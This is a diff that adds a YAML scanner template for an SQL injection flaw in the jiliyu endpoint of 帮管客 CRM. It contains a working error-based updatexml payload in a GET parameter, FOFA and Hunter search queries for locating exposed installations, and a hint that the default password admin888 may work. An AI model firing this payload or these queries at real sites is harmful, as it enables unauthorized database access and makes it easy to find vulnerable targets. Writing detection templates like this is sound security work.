@@ -1,0 +1,15 @@
+name: bgk-CRM-sqli
+rules:
+  - method: GET
+    path: /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(123456)),0x7f),1))
+    headers:
+    body: 
+    expression:                          
+      status_code: 500 
+      response_header:  
+      response_body: e10adc3949ba59a
+detail:
+  description: 帮管客CRM客户关系管理 jiliyu接口存在SQL漏洞。截至2024.4.15发现较多的网站还存在该漏洞
+  search: 
+    fofa: app="帮管客-CRM"
+    鹰图: web.body="初始密码：admin888"   #故该系统可能还有默认密码或弱口令
